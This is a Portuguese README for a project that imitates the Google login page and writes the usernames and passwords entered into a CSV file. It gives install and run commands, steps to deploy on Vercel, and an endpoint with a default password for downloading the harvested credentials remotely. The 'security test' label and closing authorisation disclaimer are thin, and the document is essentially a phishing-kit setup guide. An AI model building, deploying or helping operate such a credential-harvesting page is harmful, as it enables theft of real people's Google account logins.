# Teste de Segurança - Login Google

Sistema de teste de segurança que simula a tela de login do Google e salva as credenciais em CSV.

## Estrutura do Projeto

```
.
├── front/          # Frontend (HTML, CSS, JS)
│   ├── index.html
│   ├── style.css
│   └── script.js
├── server/         # Backend (Node.js/Express)
│   ├── server.js
│   ├── api/        # API endpoints (Vercel serverless)
│   │   ├── save-credentials.js
│   │   ├── download-csv.js
│   │   ├── status.js
│   │   └── index.js
│   └── package.json
├── package.json    # Dependências do projeto
└── vercel.json     # Configuração Vercel
```

## Instalação

1. Instale as dependências:
```bash
npm install
cd server && npm install
```

## Como usar localmente

1. Inicie o servidor:
```bash
cd server
npm start
```

2. Acesse no navegador:
```
http://localhost:3000
```

3. As credenciais serão salvas automaticamente no arquivo `credentials.csv`

## Deploy na Vercel

1. Faça push para o GitHub
2. A Vercel detectará automaticamente as configurações
3. O frontend será servido via `server/api/index.js`
4. As APIs estarão disponíveis em `/api/*`

## Acessar as credenciais salvas

Após o deploy, você pode baixar o CSV acessando:
```
https://seu-projeto.vercel.app/api/download-csv?password=senha123
```

**Para mudar a senha**, configure uma variável de ambiente na Vercel:
```bash
vercel env add DOWNLOAD_PASSWORD
```

## Segurança

⚠️ Este é um sistema de teste de segurança. Use apenas em ambientes controlados e com autorização adequada.
